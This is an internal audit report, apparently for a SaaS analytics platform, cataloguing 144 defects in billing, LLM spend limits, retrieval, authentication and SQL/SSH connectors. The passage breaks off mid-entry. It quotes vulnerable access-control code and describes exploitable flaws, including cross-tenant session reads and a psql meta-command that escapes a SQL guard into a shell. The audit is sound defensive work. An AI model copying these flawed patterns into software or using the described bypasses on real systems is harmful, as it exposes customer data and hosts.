# Full-system audit — 2026-09-09

Business logic, code and interfaces, audited as thirteen independent modules running in parallel.
Each module was given the same output contract: `file:line`, a concrete failure a reader can
picture, evidence that was **run** rather than recalled, a severity and a confidence. Every entry
below is self-contained on purpose — nothing here requires opening another document to understand
what it means or why it matters.

**This document collects. It does not fix.** No code was changed while producing it.

## What was measured

- **144 findings** across **13 modules**
- **10** critical · **55** high · **2** medium-high · **64** medium · **13** low
- Every `CRITICAL` finding was re-verified independently by the main session with its own commands
  before being recorded; the verification is quoted inside the entry.
- Modules could not see each other's work. Where several converge on one cause, that is
  corroboration rather than duplication — see *The four ruptures* below.

| Module | Area | Findings |
|---|---|---:|
| `BIZ` | Business logic vs stated promises | 15 |
| `OPS` | Background work, observability, deploy | 14 |
| `TEST` | Tests, CI gates, UX scenarios | 14 |
| `API` | HTTP routes and contracts | 13 |
| `DATA` | Data model and migrations | 11 |
| `FE` | Frontend and interface states | 11 |
| `ORCH` | Orchestrator and pipeline | 11 |
| `BILL` | Billing, subscriptions, LLM credit | 10 |
| `SQL` | Connectors, SQL safety, SSH | 10 |
| `ANA` | Analytics sources (GA4) | 9 |
| `KNOW` | Knowledge indexing | 9 |
| `RET` | Retrieval | 9 |
| `AUTH` | Authentication, tenancy, access control | 8 |
| | **total** | **144** |

---
## The four ruptures

Some findings are not separate defects. They are one rupture seen from different sides, by modules
that could not see each other — which is what makes them worth naming before the list.

### R1 — There is no ceiling on LLM spend, at any layer, on any account

Four modules arrived here independently, by four different routes:

- **BILL-01 / BIZ-01** — the per-account OpenRouter key is provisioned on subscription, Fernet-encrypted,
  budgeted into two pockets, renewed each period and revoked on cancellation. `OpenRouterAdapter.__init__`
  binds the shared operator key; `LLMRouter.__init__` has no parameter through which an account key
  could be passed. **The key is never used.**
- **DATA-01** — migration `c3d4e5f6a7b8` writes 2 500 000 / 7 500 000 into `plans` for `base`;
  `plan_catalogue_reconcile` overwrites both with `0` in the FastAPI lifespan seconds later, on **every**
  boot. `0` means unlimited. CI stays green because the test asserts against the migration's own constant
  and never reads the table.
- **API-08 / BILL-10** — four HTTP routes construct a bare `LLMRouter()`, whose default sink is
  `NullUsageSink`. That spend is recorded nowhere and checked against nothing. The codebase names this
  exact hazard in a comment one file over.
- The global fallbacks `user_daily_token_limit` / `user_monthly_token_limit` are also `0`.

The belt was deliberately loosened because the braces were believed to hold. Neither is fastened.
Four price points from $199 to $1500, and the dominant variable cost has no ceiling anywhere.

### R2 — Retrieval runs on one leg, and the gate written to catch exactly that cannot see it

- **RET-01** — the dense leg is deleted before fusion by a distance floor (`0.45`) set above what the
  production embedder produces for a correct match. Measured: **0 of 11** documents survive in three
  separate queries whose nearest neighbours were the right files, at d=0.474–0.671.
- **RET-02 / TEST-02** — the real-retriever eval omits that filter entirely and passes with the dense leg
  returning nothing at all. Its own docstring names the incident class it cannot detect.

Same shape as `hybrid_min_score = 0.03`, recorded in `CLAUDE.md` as fixed on 2026-09-02: a threshold set
above the best achievable value. Moved one stage earlier, where neither the fix nor the new eval reached.

### R3 — A claim computed from the input rather than from the outcome

`CLAUDE.md` §0d already names this class from 2026-09-09 (*"Three claims computed from the input instead
of the outcome, in a row"*). It recurs in five more places the fix never touched:

- **API-03 / OPS-05** — five `202` endpoints answer `"queued"` after an `enqueue` that returned `None`,
  having already written a run row that blocks every retry for 300 s.
- **API-12** — `connections_scanned` is `len(input_list)`.
- **KNOW-07** — `code_symbol_embed` reports a count taken from its input and swallows every failure.
- **OPS-07** — a partial enqueue failure still advances the embedding fingerprint.
- **TEST-01** — the deploy's release step uses `curl -s` with no `--fail`, and the health check that
  follows queries a public URL the *previous, still-running* release answers with 200.

### R4 — A privacy control that promises more than it delivers

- **BIZ-03** — the Privacy Policy's two-column table lists `Raw database rows/values` under **NOT sent to
  LLM**. Up to 20 rows are rendered into the tool message on every single answer.
- **BIZ-12** — `send_sample_data_to_llm` has zero frontend references and, even set to `false`, gates only
  indexing-time samples.
- **AUTH-02 / AUTH-03 / BIZ-04** — a chat session with a NULL owner is readable, renameable and deletable
  by any authenticated user, and deleting an account is what creates those NULLs.

---
## Index

| # | ID | Severity | Claim |
|--:|---|---|---|
| 1 | `AUTH-02` | CRITICAL | A chat session with a NULL owner is readable, renameable and deletable by *any* authenticated user, with no project-membership check at all |
| 2 | `BILL-01` | CRITICAL | The per-account OpenRouter key is provisioned, encrypted, metered and ceilinged, and no LLM call ever uses it; every request runs on the shared operator key |
| 3 | `BILL-02` | CRITICAL | Every top-up, refund and chargeback resets the spend ceiling to *current* usage, forgiving everything spent so far in the period |
| 4 | `BIZ-01` | CRITICAL | The metered LLM allowance every paid tier is sold on is provisioned, budgeted, renewed and revoked — and never used to make a single inference call |
| 5 | `BIZ-03` | CRITICAL | The Privacy Policy states in a two-column table that raw database rows are NOT sent to the LLM; every answer sends them |
| 6 | `DATA-01` | CRITICAL | The paid tiers' token ceilings are erased at every boot; migration `c3d4e5f6a7b8` is undone by `plan_catalogue_reconcile` seconds later |
| 7 | `KNOW-01` | CRITICAL | The document content-hash cache and the embedding reindex cancel each other out: a fingerprint bump drops every vector, then reuses the documents whose chunks it just deleted, so they are never re-embedded |
| 8 | `RET-01` | CRITICAL | the dense leg is deleted before fusion by a distance floor set above what the embedder can produce |
| 9 | `SQL-01` | CRITICAL | In SSH-exec mode the query is piped to `psql`/`mysql` stdin, so a psql backslash meta-command survives `SafetyGuard` and executes an arbitrary shell command on the bastion host |
| 10 | `TEST-01` | CRITICAL | the production release step cannot fail, and the health check that follows it verifies the *previous* release |
| 11 | `ANA-01` | HIGH | A genuinely empty day is reported to the user as "the vendor truncated this period" |
| 12 | `ANA-02` | HIGH | A complete, successful vendor page is discarded when it is the request that spends the last quota token, and the retries that follow cannot succeed |
| 13 | `ANA-07` | HIGH | `list_reports()` counts as grounding, so an invented figure ships with no caveat, no freshness line, and no validator warning |
| 14 | `API-01` | HIGH | `/api/chat/ask/stream` leaks its per-session lock when the agent limiter refuses, wedging that chat session with 409 for up to an hour |
| 15 | `API-02` | HIGH | Every streaming response pins its request-scoped database connection for the whole stream; `/api/workflows/events` holds one indefinitely |
| 16 | `API-03` | HIGH | Five `202` endpoints answer `"status": "started"` without checking whether the job was actually enqueued, and leave a run row that blocks every retry |
| 17 | `API-04` | HIGH | `POST /api/visualizations/export` with `format=xlsx` blocks the event loop for ~100 s on input the schema explicitly permits |
| 18 | `API-05` | HIGH | The rate limiter is keyed on `request.client.host`, which behind Heroku's router is the same address for every caller |
| 19 | `API-08` | HIGH | Four routes spend LLM tokens through a bare `LLMRouter()`, so the spend is neither budget-checked nor recorded |
| 20 | `AUTH-01` | HIGH | An unverified email/password account can accept another person's project invitation, defeating the F-PROJ-01 verification gate |
| 21 | `AUTH-03` | HIGH | `list_sessions` and `validate_session_access` treat a NULL owner as "belongs to whoever is asking", so ownerless sessions are listed to and writable by every project member |
| 22 | `BILL-03` | HIGH | A refund or chargeback whose reversal fails is committed to the idempotency ledger as processed; the exact reasoning `_credit_top_up` was corrected for is still in place for money going out |
| 23 | `BILL-04` | HIGH | Subscription events are applied with no ordering guard, so an out-of-order `updated` after `deleted` resurrects a cancelled account and mints it a fresh spending key |
| 24 | `BILL-05` | HIGH | The duplicate-subscription guard reads a field only the webhook writes, so two concurrent checkouts both pass and the second Stripe subscription silently overwrites the first |
| 25 | `BILL-08` | HIGH | A renewal that fails is committed as processed, and the *next* renewal then debits purchased credit for spend the included allowance already covered |
| 26 | `BIZ-02` | HIGH | `team` and `enterprise` are absent from the included-credit table, so their advertised LLM credit provisions as $0 |
| 27 | `BIZ-04` | HIGH | Deleting an account does not delete the user's chats in projects they do not own, and the `SET NULL` widens who can read them |
| 28 | `BIZ-05` | HIGH | Invariant 4 ("learning is per-connection") is enforced for learnings and broken for insights: they are stored per-connection and injected project-wide |
| 29 | `BIZ-06` | HIGH | Invariant 6 ("user feedback is the highest authority") has no investigation behind it: the entire InvestigationAgent user surface is unreachable code |
| 30 | `BIZ-07` | HIGH | Invariant 3 ("every answer is traceable") holds for the three chat transports and fails for MCP, for two abort paths, and for every user who is not the project owner |
| 31 | `DATA-02` | HIGH | 81 columns are `NOT NULL` in the model and nullable in the schema the migrations build, so the test schema is stricter than production |
| 32 | `DATA-03` | HIGH | `db_index.row_count` is a 32-bit `Integer` fed directly from `reltuples::bigint` and ClickHouse `total_rows` (UInt64) |
| 33 | `FE-01` | HIGH | A request that hits the client's own 60 s timeout is retried twice instead of failing, so one GET becomes three requests and ~182 s of waiting |
| 34 | `FE-02` | HIGH | A session poll that lands after the user has switched conversations drags them back to the old one |
| 35 | `FE-03` | HIGH | Any failure of `POST /auth/refresh` signs the user out and bounces them to `/login` with no explanation |
| 36 | `FE-04` | HIGH | A dashboard that failed to load reports itself as "Dashboard not found" |
| 37 | `FE-05` | HIGH | After a page reload, a clarification question the agent asked becomes unanswerable |
| 38 | `KNOW-02` | HIGH | `generate_docs` deletes the symbol chunks `code_symbol_embed` wrote earlier in the same run, for every file that has both |
| 39 | `KNOW-03` | HIGH | Symbol chunk ids embed `start_line`, and nothing sweeps a *changed* file, so every line shift leaves the old source body in the vector store forever |
| 40 | `KNOW-04` | HIGH | On an incremental run the CALLS resolver only sees the changed files, so every changed file loses its out-edges to unchanged files — permanently |
| 41 | `KNOW-05` | HIGH | The full-rebuild graph path has no zero-symbol guard, so a parser outage wipes the entire code graph and reports "completed" |
| 42 | `KNOW-06` | HIGH | `_incremental_update` never drops an entity whose defining file changed and no longer defines it, so removed models accumulate in the knowledge cache forever |
| 43 | `KNOW-07` | HIGH | `code_symbol_embed` swallows every failure, reports a count taken from its input, and then checkpoints itself as complete |
| 44 | `KNOW-08` | HIGH | Checkpoint resume ignores `force_full`, so the nightly incremental silently continues an abandoned full rebuild under the incremental ceiling — and the test written to prevent this asserts on the flag, not the work |
| 45 | `OPS-01` | HIGH | The worker process never initialises Sentry, so no background-job failure is ever reported |
| 46 | `OPS-02` | HIGH | The web lifespan runs its boot reaper sweep before the task queue exists — the exact defect fixed in the worker on 2026-09-09, in the file the fix's test does not read |
| 47 | `OPS-03` | HIGH | Every counter emitted by background work is written into a process that exposes no metrics endpoint |
| 48 | `OPS-04` | HIGH | Four maintenance jobs are gated behind 24 hours of uninterrupted uptime, on a platform that restarts the dyno roughly daily |
| 49 | `OPS-05` | HIGH | Four routes tell the user the job is queued after an enqueue that returned `None` |
| 50 | `OPS-06` | HIGH | `run_db_index`'s whole-job ARQ ceiling is the same 1800 s as the budget of one of its steps |
| 51 | `OPS-07` | HIGH | A partial enqueue failure still advances the embedding fingerprint, leaving those projects' vectors dropped and unrebuildable |
| 52 | `OPS-08` | HIGH | The worker will run eight repo indexes at once, and one already exceeds the dyno's memory |
| 53 | `ORCH-01` | HIGH | `query_analytics_source` is in the planner's prompt and in the executor's dispatch, but not in the plan validator's tool set, so no analytics stage can ever be planned |
| 54 | `ORCH-02` | HIGH | a correct zero-row result fails the pipeline stage, while the identical result is only a warning in the flat loop |
| 55 | `ORCH-03` | HIGH | the LayerChecker rejects a parallel layer and the replan then seeds the rejected results straight into the next plan |
| 56 | `RET-02` | HIGH | no gate exercises that filter; the two tests that "validate" it assert arithmetic, and the real-retriever eval builds the retriever without it |
| 57 | `RET-03` | HIGH | when *both* legs come back empty, nothing is emitted at all: total retrieval failure is the only silent case |
| 58 | `RET-05` | HIGH | every ContextPack request builds a fresh `KnowledgeCatalogService`, so the full BM25 corpus is gunzipped and re-indexed per question |
| 59 | `RET-06` | HIGH | the web dyno's lexical corpus is frozen at the first read after boot and nothing can refresh it |
| 60 | `SQL-02` | HIGH | SSH-exec mode establishes no engine-level read-only session; `is_read_only` is never applied to the CLI, so the documented layering collapses to the regex alone |
| 61 | `SQL-03` | HIGH | MySQL's row cap does not stop the transfer, and a timed-out query returns a protocol-desynced connection to the pool |
| 62 | `SQL-04` | HIGH | The SSH-exec connector truncates output mid-line at 10 MB and reports `truncated=False`; it applies no row cap at all |
| 63 | `TEST-02` | HIGH | the "real retriever" eval gate passes with the dense/vector leg returning nothing at all |
| 64 | `TEST-03` | HIGH | `DEPRECATED` in `exclude_lines` lets a prose comment delete a whole function from the coverage gate |
| 65 | `TEST-04` | HIGH | the guard that proves "a coverage gate exists in CI" is satisfied by a comment |
| 66 | `BIZ-09` | MEDIUM-HIGH | The pricing page sells a Free plan and a Pro tier that were retired on 2026-08-31 |
| 67 | `RET-08` | MEDIUM-HIGH | the reindex fingerprint carries a setting that is inert on the production backend, so the documented remedy for a boot warning silently destroys every project's vectors |
| 68 | `ANA-03` | MEDIUM | A permanently invalid request (HTTP 400) does not stop the report, so the whole window is re-attempted on every run, forever |
| 69 | `ANA-04` | MEDIUM | HTTP 404 is recorded as a *completed* period, so a wrong property id reads as "collected, and it was zero" |
| 70 | `ANA-05` | MEDIUM | Totals are summed over every `property_id` ever collected, including properties removed from the connection |
| 71 | `ANA-06` | MEDIUM | `backfill_days` has no server-side bound; the documented "Clamped to 1–3650" lives only in the React form |
| 72 | `API-06` | MEDIUM | A `429` carries two mutually incompatible bodies, and `API.md` documents only one of them |
| 73 | `API-07` | MEDIUM | Three routes answer `200` with an error inside, and two of them echo the raw exception string |
| 74 | `API-09` | MEDIUM | Paginated list endpoints load the entire table into memory and then slice in Python |
| 75 | `API-10` | MEDIUM | The `GET …/members` cap markers cannot reach the browser, and there is no way to fetch past the cap |
| 76 | `API-11` | MEDIUM | `POST /api/batch/execute` puts no bound on the query list and runs the whole batch inside the web dyno |
| 77 | `AUTH-04` | MEDIUM | Every MCP agent call acquires the shared concurrency/quota slot twice, halving each MCP user's limits |
| 78 | `AUTH-05` | MEDIUM | One global git-webhook secret authorises re-indexing of any project id, in any tenant |
| 79 | `AUTH-06` | MEDIUM | MCP `execute_raw_query` hands the raw connector exception to the MCP client, bypassing the scrubber every sibling path uses |
| 80 | `AUTH-07` | MEDIUM | `get_accessible_projects` is a third, member-only reader of an access rule that documents itself as having one source of truth |
| 81 | `BILL-06` | MEDIUM | `_resolve_plan_id`'s stale-catalogue fallback writes an unvalidated `metadata.plan_id` into a foreign-key column, so the recovery path 500s the webhook forever |
| 82 | `BILL-07` | MEDIUM | `_charge_owner` makes a blocking Stripe HTTP call on the event loop, against the module's own stated invariant |
| 83 | `BILL-09` | MEDIUM | `seats` is priced, published on the pricing page and carried through entitlements, and enforced nowhere |
| 84 | `BILL-10` | MEDIUM | LLM calls on authenticated, user-triggered paths reach `NullUsageSink`; the highest-frequency one fires on nearly every chat question |
| 85 | `BIZ-08` | MEDIUM | An answer can be returned with its rows and its explanation but with `query: null`, while the landing page promises the SQL is always shown |
| 86 | `BIZ-10` | MEDIUM | `vision.md` §8 still denies storing production data; the product stores 500 rows per answer plus per-column value samples |
| 87 | `BIZ-11` | MEDIUM | Stripe and Sentry receive user data; the Privacy Policy's third-party section lists only LLM providers and Google, and the landing page says "no telemetry" |
| 88 | `BIZ-12` | MEDIUM | `send_sample_data_to_llm` is a privacy control with no user interface, and it does not do what its name says |
| 89 | `BIZ-13` | MEDIUM | README advertises the cross-encoder reranker as default-on; it is default-off and a no-op in every deployment that has ever run |
| 90 | `BIZ-14` | MEDIUM | SCN-052 contradicts itself, and its `Coverage` line numbers are 40–55 lines adrift while stamped `implemented / PASS` |
| 91 | `DATA-04` | MEDIUM | The schema has zero `CHECK` constraints, and `indexing_runs.status` is the predicate of the single-active-run guard |
| 92 | `DATA-05` | MEDIUM | `audit_logs` is missing from `app/models/__init__.py`, so it is absent from the metadata Alembic autogenerates against |
| 93 | `DATA-06` | MEDIUM | Money is stored as `Float` in three places, in a codebase whose own model file argues it must not be |
| 94 | `DATA-07` | MEDIUM | `mcp_api_keys.token_hash` carries two indexes in production, and the index of that name is unique in tests and non-unique in production |
| 95 | `DATA-08` | MEDIUM | `uq_error_log_project_sig` is a unique index over a nullable column, so the dedup rule it exists to enforce does not apply to system-scoped errors |
| 96 | `DATA-09` | MEDIUM | The `doc_embeddings` expression index covers only one of the two metadata keys the delete path filters on |
| 97 | `DATA-10` | MEDIUM | Both `web` and `worker` run `alembic upgrade head` concurrently at every deploy, and only one of them retries |
| 98 | `FE-06` | MEDIUM | A background task whose completion event is missed spins forever; a task that has only just been queued is labelled "1 done" |
| 99 | `FE-07` | MEDIUM | A saved-queries panel whose fetch failed says "No saved queries yet" |
| 100 | `FE-08` | MEDIUM | The chat stream's 120-second idle timeout can never report itself as a timeout |
| 101 | `FE-09` | MEDIUM | The chat scrolls itself once per streamed token, with `behavior: "smooth"` and no reduced-motion exit |
| 102 | `KNOW-09` | MEDIUM | Four steps record completion that nothing reads, and three of them carry comments asserting a resume guard that does not exist |
| 103 | `OPS-09` | MEDIUM | The worker's BM25 reconcile is awaited in `on_startup`, and its own comment says it does not block job pickup |
| 104 | `OPS-10` | MEDIUM | The reaper's requeue budget counts the reap it is currently performing, so the documented "2 per 6 h" is really 1 |
| 105 | `OPS-11` | MEDIUM | `record_run` recomputes `next_run_at` at completion, silently discarding the slot `claim_due` reserved |
| 106 | `OPS-12` | MEDIUM | `config.py` asserts an invariant that is arithmetically false and names a test that deliberately deleted it |
| 107 | `OPS-13` | MEDIUM | The capability report prints "all satisfied" when a claim could not be evaluated, and never runs in the worker |
| 108 | `ORCH-04` | MEDIUM | both production pipelines build `StageValidator()` without an LLM router, so business-rule validation is a one-substring heuristic |
| 109 | `ORCH-05` | MEDIUM | two per-workflow caches on the process-lifetime orchestrator singleton are never swept |
| 110 | `ORCH-06` | MEDIUM | the resumed pipeline runs without the answer-quality gate and without the freshness warning the fresh path supplies |
| 111 | `ORCH-07` | MEDIUM | a fallback to the flat loop overwrites the router's real verdict, so metrics and the persisted trace report `explore`/`moderate` |
| 112 | `ORCH-08` | MEDIUM | a failed final synthesis is reported as `pipeline_complete` whenever the plan does not end in a `synthesize` stage |
| 113 | `ORCH-09` | MEDIUM | the pipeline's truncation caveat and its answer gate read only the *last* stage that produced rows |
| 114 | `ORCH-10` | MEDIUM | a resumed stage's prompt reports the original row count beside ten persisted sample rows and never says the set is a sample |
| 115 | `ORCH-11` | MEDIUM | a connection error re-runs the identical statement with no idempotency check, including DML on a writable connection |
| 116 | `RET-04` | MEDIUM | the dense leg's degradation reason says the cause is unknown while the retriever itself is the cause |
| 117 | `RET-07` | MEDIUM | the tokenizer fallback under-counts code tokens by up to 67%, and the chunk it lets through carries no truncation signal |
| 118 | `RET-09` | MEDIUM | the eval's nDCG normalises against what was retrieved, not against what exists, so it cannot see a recall regression |
| 119 | `SQL-05` | MEDIUM | `format_template`'s shell escaping passes a trailing newline through unquoted, and re-substitutes placeholders found *inside* config values, leaking the DB password into the remote command line |
| 120 | `SQL-06` | MEDIUM | The `ssh_pre_commands` allowlist protects nothing, because `ssh_command_template` sits in the same shell line with no validation at all |
| 121 | `SQL-07` | MEDIUM | `check_connection_targets` runs only at create/update, so the DNS-rebinding attack its own docstring names is unmitigated |
| 122 | `SQL-08` | MEDIUM | Sample rows, distinct values and column statistics are fetched by bare table name, so a non-`public` schema is sampled from the wrong table and same-named tables collide in the index |
| 123 | `SQL-09` | MEDIUM | MongoDB results take their column list from the first document only, so fields that appear later are dropped without a truncation signal |
| 124 | `TEST-05` | MEDIUM | the same guard passes while the number it exists to keep consistent is stated as 72% in two places a contributor actually reads |
| 125 | `TEST-06` | MEDIUM | the startup smoke suite is documented as a CI/boot gate and is executed by neither |
| 126 | `TEST-07` | MEDIUM | `TestTheFloorsAreFloors` claims to compare the floors against measured performance and only checks they are between 0 and 1 |
| 127 | `TEST-08` | MEDIUM | the Coverage-path existence check covers one of the three UX documents, and one of the unguarded two names a component that was deleted |
| 128 | `TEST-09` | MEDIUM | three guards assert a literal source string, so a behaviour-preserving edit turns them red and a behaviour-destroying one leaves them green |
| 129 | `TEST-10` | MEDIUM | the contrast test re-implements the alpha values it is testing, so the shipped opacity can drop below AA without failing |
| 130 | `TEST-11` | MEDIUM | two module-level `skipif` guards, left over from unmerged dependencies, silently delete whole test files if their target is renamed |
| 131 | `TEST-13` | MEDIUM | `importlib.reload(app.main)` splits the FastAPI app into two live objects for the rest of the process |
| 132 | `ANA-08` | LOW | Two different required-field lists validate the same service-account JSON, so a key missing `token_uri` is accepted at paste and fails at collect time |
| 133 | `ANA-09` | LOW | The runbook documents a `_connect` bug that the code does not have |
| 134 | `API-12` | LOW | `POST /api/feed/{project_id}/scan` reports `connections_scanned` from its input, not from what succeeded |
| 135 | `API-13` | LOW | `API.md`'s rate-limiting paragraph names five throttled endpoints as unthrottled and states a route count that is 7 low |
| 136 | `AUTH-08` | LOW | `update_member_role` writes the role without validating it; the F-PROJ-07 guard was applied to only one of the two writers |
| 137 | `BIZ-15` | LOW | The Privacy Policy describes an architecture that is not the deployed one: SQLite/ChromaDB "local-first", and an auth token in localStorage |
| 138 | `DATA-11` | LOW | `ix_code_graph_symbols_cluster` exists in the migrations and in no model, so it is absent from every `create_all` schema |
| 139 | `FE-10` | LOW | The MCP token list paints two states in raw Tailwind palette colours that do not follow the theme |
| 140 | `FE-11` | LOW | The readiness cache records when it was checked and nothing ever reads it |
| 141 | `OPS-14` | LOW | `TracePersistenceService` has no cross-process-echo guard, so it buffers every worker workflow in the web dyno and force-drops it after 300 s |
| 142 | `SQL-10` | LOW | A parenthesised SELECT skips the Postgres server-side cursor and materialises the whole result set in memory |
| 143 | `TEST-12` | LOW | the scenario anchor count credits the wrong scenario for a suffixed id |
| 144 | `TEST-14` | LOW | 166 `file:line` citations in the scenario base are unchecked, and the project's own audit data says they rot far faster than the claims do |

---


# CRITICAL


## AUTH-02 — A chat session with a NULL owner is readable, renameable and deletable by *any* authenticated user, with no project-membership check at all

*`AUTH` — Authentication, tenancy, access control*

- **Where**: `backend/app/api/routes/chat_sessions.py:133` (inside `_require_session_owner`, defined at `:128`), used by `PATCH /sessions/{session_id}` (`:147`), `POST /sessions/{id}/generate-title` (`:166`), `DELETE /sessions/{session_id}` (`:247`) and `GET /sessions/{session_id}/messages` (`:272`)
- **What is wrong**: The guard is `if session_obj.user_id and session_obj.user_id != user_id` — a falsy owner short-circuits the comparison, so a NULL owner authorises everyone. The same function performs **no** project-membership check, so the caller need not belong to the session's project or to the tenant at all. NULL owners are not hypothetical: `chat_sessions.user_id` is `ondelete="SET NULL"` (`app/models/chat_session.py:24-29`, created in `alembic/versions/d8a2f4b19c73_add_project_members_invites_and_ownership.py:64-68`), and that same migration **added the column nullable with no backfill**, so every session created before it is permanently ownerless. This is the exact pattern the codebase refuses by name for the other two owner-scoped stores (`app/services/ssh_key_service.py:71-76`, `app/services/vendor_credential_service.py:158-165`: "a NULL-owner key must NOT leak to a tenant, so do not union `user_id.is_(None)`").
- **Concrete failure**: User B deletes their account via `DELETE /api/auth/account` while holding chat sessions in project P, which is owned by someone else (their own owned projects cascade away; sessions in other people's projects do not). The FK sets those rows' `user_id` to NULL. Any authenticated user of the platform — including one in an unrelated tenant with no membership in P — who holds one of those session ids issues `GET /api/chat/sessions/{id}/messages` and receives the full transcript: the questions, the generated SQL, the row samples and the `metadata_json`/`tool_calls_json` of every turn. The same user can `DELETE` the session. Ids reach co-members for free via AUTH-03.
- **Evidence**:
```python
# app/api/routes/chat_sessions.py:128-135
async def _require_session_owner(db: AsyncSession, session_id: str, user_id: str):
    """Return the session if the user owns it, else raise 403/404."""
    session_obj = await _chat_svc.get_session(db, session_id)
    if not session_obj:
        raise HTTPException(status_code=404, detail="Session not found")
    if session_obj.user_id and session_obj.user_id != user_id:
        raise HTTPException(status_code=403, detail="Not your session")
    return session_obj
```
```python
# alembic/versions/d8a2f4b19c73_...py:64-68  — added nullable, never backfilled
    with op.batch_alter_table("chat_sessions") as batch_op:
        batch_op.add_column(sa.Column("user_id", sa.String(36), nullable=True))
        batch_op.create_foreign_key(
            "fk_chat_sessions_user_id", "users", ["user_id"], ["id"], ondelete="SET NULL"
        )
```
- **Severity**: critical — cross-tenant read and delete of chat transcripts that contain query results from a customer's database, through an authenticated-but-unrelated principal.
- **Confidence**: certain for the code path. What would settle the live blast radius is one query: `SELECT count(*) FROM chat_sessions WHERE user_id IS NULL;` on production.

---

## BILL-01 — The per-account OpenRouter key is provisioned, encrypted, metered and ceilinged, and no LLM call ever uses it; every request runs on the shared operator key

*`BILL` — Billing, subscriptions, LLM credit*

- **Where**: `backend/app/llm/openrouter_adapter.py:117`, `backend/app/llm/router.py:165`, `backend/app/services/openrouter_credit_service.py:103`
- **What is wrong**: `BillingService._sync_subscription` mints a per-account OpenRouter key with a dollar `limit` and stores it Fernet-encrypted (`billing_service.py:876-894`), and `plan_catalogue.py:12-15` states outright that token ceilings stay `0` because "the spend limit lives on the account's OpenRouter key as a dollar balance, which is the only place that can enforce it mid-request." But `OpenRouterAdapter.__init__` binds `settings.openrouter_api_key` — one global operator key — at construction, and `LLMRouter` carries no user or account context at all: its only constructor argument is `usage_sink`. `row.key_encrypted` is decrypted in exactly one place, `provision()` returning the key it just created, and `billing_service.py:894` discards that return value. The spending instrument the entire commercial model rests on is write-only.
- **Concrete failure**: A `base` customer ($199/mo, `_INCLUDED_CREDIT_USD["base"] = 30.0`) subscribes. A key is created at OpenRouter with `limit=30.0`, and the customer never sends a single token through it. They then run a full repository index — 1 666 411 tokens on the one production project per `CLAUDE.md` — against `settings.openrouter_api_key`. OpenRouter bills the operator; the customer's key still reads `usage=0`; `balance()` (which no route calls) would report $30.00 remaining forever. Nothing anywhere stops the spend: all four tiers carry `daily_token_limit: 0` / `monthly_token_limit: 0` (`plan_catalogue.py:73-74, 90-91, 108-109, 126-127`), `settings.user_daily_token_limit` and `user_monthly_token_limit` both default to `0` (`config.py:1074-1075`), so `check_token_budget` returns `None` at `usage_service.py:150-151` before it queries anything, for every account on every request.
- **Evidence**:
  ```
  # app/llm/openrouter_adapter.py:115-121
  class OpenRouterAdapter(BaseLLMProvider):
      def __init__(self):
          self._api_key = settings.openrouter_api_key
          self._client = httpx.AsyncClient(
              base_url=OPENROUTER_BASE_URL,
              headers={"Authorization": f"Bearer {self._api_key}", ...

  $ grep -rn "key_encrypted" app/ | grep -v pyc
  app/services/openrouter_credit_service.py:102,103,121,305   # provision / revoke only
  app/models/llm_credit.py:47
  ```
  No `ContextVar`, no per-request key injection, and `OpenRouterCreditService()` is constructed only from `billing_service.py` (six sites, all lifecycle).
- **Severity**: critical — there is no spend ceiling of any kind on any account, and the code comment at `usage_sink.py:121-123` uses the non-existent ceiling ("OpenRouter counts and the key's own ceiling stops the spend") to justify running background indexing with `gate=False`.
- **Confidence**: certain. Settled by the greps above; a single reader of `key_encrypted` outside `openrouter_credit_service.py` would overturn it, and there is none.

---

## BILL-02 — Every top-up, refund and chargeback resets the spend ceiling to *current* usage, forgiving everything spent so far in the period

*`BILL` — Billing, subscriptions, LLM credit*

- **Where**: `backend/app/services/openrouter_credit_service.py:85-91`, called from `:170` (`top_up`) and `:206` (`_adjust` → `debit`/`restore`)
- **What is wrong**: `included_grant_usd` and `purchased_balance_usd` are *granted* amounts, decremented only by `renew()` (`:270-271`). `usage_at_period_start` is the watermark that turns OpenRouter's monotonic counter into "spent this period" — `llm_credit.py:15-17` calls it "the hinge". `_limit_for` ignores it and anchors on the live `usage` instead, so the ceiling it pushes is `usage_now + full_grant + full_purchased`. Only `renew()` is correct, and only because it assigns `usage_at_period_start = usage` on the line before it calls `_limit_for`.
- **Concrete failure**: `base` customer, `included_grant_usd = 30`, `purchased_balance_usd = 0`, `usage_at_period_start = 0`. They spend $28; OpenRouter reports `usage = 28`, remaining headroom $2. They buy a $10 top-up. `top_up` sets `purchased_balance_usd = 10` and pushes `limit = 28 + 30 + 10 = 68`, leaving headroom of `68 − 28 = $40`. The correct figure is `$2 + $10 = $12`. **$28 of the operator's money handed over for a $10 purchase**, and the larger the in-period spend the larger the gift. The same expression runs on `debit`: a customer who spends $28, then charges back their $10 top-up, gets their money returned *and* their headroom raised from $2 to $30.
- **Evidence**:
  ```python
  # app/services/openrouter_credit_service.py:85-91
  async def _limit_for(self, row: LlmCredit, usage: Decimal) -> Decimal:
      """The ceiling to send OpenRouter: everything spent, plus both live pockets."""
      return _q(usage + _q(row.included_grant_usd) + _q(row.purchased_balance_usd))
  ```
  The existing test enshrines it: `tests/unit/services/test_openrouter_credit_ledger.py:65-67` asserts `_limit_for(row(included=30, purchased=20), usage=100) == 150` — an account that has already spent $100 against a $50 lifetime grant being handed another $50.
- **Severity**: critical — direct, repeatable transfer of operator money, triggered by the customer at a moment of their choosing.
- **Confidence**: certain. `usage_at_period_start` is on the row, is the documented anchor, and is not read by `_limit_for`; `balance()` at `:142` computes `spent = usage − usage_at_period_start` from the same row, so the two readings of the pockets contradict each other inside one class.

---

## BIZ-01 — The metered LLM allowance every paid tier is sold on is provisioned, budgeted, renewed and revoked — and never used to make a single inference call

*`BIZ` — Business logic vs stated promises*

- **The promise**: `backend/app/services/plan_catalogue.py:72` — Base is `"…1 GB index, $30/month of LLM credit at cost."` and the file's own docstring, `plan_catalogue.py:12-15`: *"**Token ceilings stay 0.** … the spend limit lives on the account's OpenRouter key as a dollar balance, **which is the only place that can enforce it mid-request**. A token count in this table would be a second, weaker copy of that limit."*
- **Where the code differs**: `backend/app/llm/openrouter_adapter.py:117` and `backend/app/llm/router.py:165`
